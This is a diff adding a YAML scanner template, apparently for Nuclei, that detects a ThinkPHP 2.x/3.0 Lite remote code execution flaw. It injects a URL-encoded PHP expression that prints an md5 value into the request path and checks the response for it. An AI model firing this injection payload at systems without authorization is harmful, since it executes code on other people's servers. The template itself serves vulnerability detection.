@@ -1,0 +1,25 @@
+id: poc-local-thinkphp-v2-lite-code-exec
+
+info:
+  name: poc-local-thinkphp-v2-lite-code-exec
+  author: capiton
+  severity: critical
+  description: ThinkPHP 2.x version and 3.0 in Lite mode Remote Code Execution.
+  reference: https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/2-rce
+  tags: thinkphp,rce
+
+variables:
+  randInt: "{{rand_int(10000,99999)}}"
+  md5_randInt: "{{md5(randInt)}}"
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php/module/action/param1/$%7B@print%28md5%28{{randInt}}%29%29%7D"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        condition: and
+        words:
+          - "{{md5_randInt}}"
